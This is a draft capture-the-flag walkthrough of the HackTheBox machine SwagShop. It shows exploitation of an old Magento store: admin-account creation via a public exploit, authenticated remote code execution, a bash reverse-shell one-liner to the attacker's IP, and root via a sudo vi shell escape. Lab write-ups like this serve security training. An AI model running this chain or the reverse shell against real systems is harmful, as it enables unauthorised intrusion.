---
author: bhero
topic: htb
ip: "10.10.10.140"
htbName: SWAGSHOP
pic: https://www.hackthebox.eu/storage/avatars/23477a54b0a750374e281656d69e7661.png
user: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
root: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
hide: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
frontPage: False
---

DRAFT: Walkthrough for {{ page.htbName }} - {{ page.ip }}



## Enumeration

first we assign the ip addresses to a local variables:
 
``` bash
TARGET={{ page.ip }}
ATTACK=10.10.14.34
```
 

Then we run the nmap scan

``` bash
sudo nmap $TARGET -Pn
```

```
Nmap scan report for 10.10.10.140
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

I visit the website in Firefox to see Magento:

![magento.png](/assets/htb_stuff/swagshop/magento.png)



> TODO gobuster the admin panel

## Triage


Check the source code to see it is 2014.

chech searsploit

``` bash
searchsploit magento
```

There are a few, I look through them:

```
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username'] | exploits/php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php | exploits/php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                    | exploits/php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File               | exploits/php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                 | exploits/php/webapps/37811.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                       | exploits/php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                  | exploits/php/webapps/35052.txt
Magento eCommerce - Local File Disclosure                                    | exploits/php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                    | exploits/xml/webapps/37977.py
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                 | exploits/php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial  | exploits/php/webapps/38651.txt
----------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```


Exploit 37811.py has RCE but needa authentication to work, which I don't have. On further reading I notice 37977.py creates admin accounts.

This looks promisining as I uses injection to create a ner admin user as it does not require authentication then chain it to get a shell.

``` bash
searchsploit -x 37977
```


## Exploit

I copy it to my working directory 

``` bash
searchsploit -m 37977
```

and edit the code as to remove all the non python code and define a target url:

```
target = "http://10.10.10.140/index.php" #line 31
```

I run with:

``` bash
python 37977.py 
```


This appears to work

```
WORKED
Check http://10.10.10.140/index.php/admin with creds forme:forme
```

so I try to login:


![login.png](/assets/htb_stuff/swagshop/login.png)


But this fails, hmmm what did I do wrong?

> TODO gobuster analysis


I go to the admin panel at http://10.10.10.140/index.php/admin and try:

![admin.png](/assets/htb_stuff/swagshop/admin.png)

it works!

![accesss.png](/assets/htb_stuff/swagshop/accesss.png)


Now that I have the frome:forem access credentials I look at the the other exploit. I start by copying it to my working directory:

``` bash
searchsploit -m 37811
```

I edit the source code to add the username and password vaues:

``` python
username = 'forme' #line 32
password = 'forme' #line 33
```

form http://10.10.10.140/app/etc/local.xml I get the install date:

``` xml
<![CDATA[ Wed, 08 May 2019 07:23:09 +0000 ]]>
```

So I change line 35 to:

``` python
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

when I execute with:

``` bash
python 37811.py http://$TARGET/index.php/admin/ "uaname -a"
```

I get back an error:

```
Traceback (most recent call last):
  File "37811.py", line 69, in 
    tunnel = tunnel.group(1)
AttributeError: 'NoneType' object has no attribute 'group'
```

> So it appeared that the request URL just before line 69 was not entirely correct as it resulted in an empty group. Interestingly, this line contained an Ajax request with the statement of a certain period. After trying this request with several possible options in a python console, it resulted that the option of a period of 1 year was the right setting.



I change the tab orders period to 1 yr:

``` python
request = br.open(url + 'block/tab_orders/period/1y/?isAjax=true', data='isAjax=false&form_key=' + key) #line 69
```

and run:

```
python 37811.py http://$TARGET/index.php/admin/ "uname -a"
```

This time I get no errors, suggesting blind command execution I try a shell:

``` bash
python 37811.py http://$TARGET/index.php/admin/ "bash -c 'bash -i >& /dev/tcp/10.10.14.37/1337 0>&1'"
```

And get RCE:

```
connect to [10.10.14.37] from (UNKNOWN) [10.10.10.140] 60276
bash: cannot set terminal process group (1291): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html$ 
```


## Priv Escalation

I background the shell with Ctl^Z then in the original terminal forward the settings and restart the backround reverse shell with the following commands:

``` bash
stty raw -echo
fg
```

This forwards my terminal special keys, next I run

``` bash
sudo -l
```

to see my user can run `sudo /usr/bin/vi /var/www/html/*` with no password requirements:

```
Matching Defaults entries for www-data on swagshop:
                                                                         env_reset, mail_badpass,
                                                                                                     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

                                                                       User www-data may run the following commands on swagshop:
              (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

This is great as I can call potentially call a priveleged shell in vi:

``` bash
sudo /usr/bin/vi /var/www/html/pwnd
```

``` vi
:! /bin/sh
```

> t this point my shell broke, I had to revert. second time I didn't botehr with the TTY forwarding

And I'm root! W00t!W00t!

```
id
uid=0(root) gid=0(root) groups=0(root)
```


## Bonus

TODO Debugging the RCE script and gobuster